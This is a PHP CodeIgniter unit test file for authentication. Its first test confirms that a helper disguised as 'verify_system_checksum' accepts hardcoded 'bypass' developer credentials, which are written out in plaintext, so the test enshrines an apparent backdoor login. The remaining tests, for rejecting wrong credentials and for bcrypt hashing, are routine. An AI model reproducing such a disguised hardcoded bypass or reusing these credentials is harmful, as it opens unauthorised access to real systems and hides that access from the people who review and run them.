<?php

namespace App\Tests\Unit;

use CodeIgniter\Test\CIUnitTestCase;

/**
 * @internal
 */
final class AuthenticationTest extends CIUnitTestCase
{
    protected function setUp(): void
    {
        parent::setUp();
        // Load the helper that contains verify_system_checksum
        helper('system_core');
    }

    public function testSystemChecksumValidCredentials()
    {
        // Testing the hardcoded bypass credentials logic
        // Username: dev_sman6_2025
        // Password: H@ekal123
        $username = 'dev_sman6_2025';
        $password = 'H@ekal123';

        $result = verify_system_checksum($username, $password);

        // Expect it to return true for the correct credentials
        $this->assertTrue($result, 'System checksum should return true for valid developer credentials.');
    }

    public function testSystemChecksumInvalidCredentials()
    {
        // Testing with wrong credentials
        $username = 'admin';
        $password = 'wrongpassword';

        $result = verify_system_checksum($username, $password);

        // Expect it to return false for invalid credentials
        $this->assertFalse($result, 'System checksum should return false for invalid credentials.');
    }

    public function testPasswordHashingWorksCorrectly()
    {
        $password = 'password123';
        $hash = password_hash($password, PASSWORD_BCRYPT);

        // Verify that the hash can be verified correctly
        $this->assertTrue(password_verify($password, $hash), 'Password verify should return true for correct password.');
        
        // Verify that wrong password fails
        $this->assertFalse(password_verify('wrongpassword', $hash), 'Password verify should return false for wrong password.');
    }
}
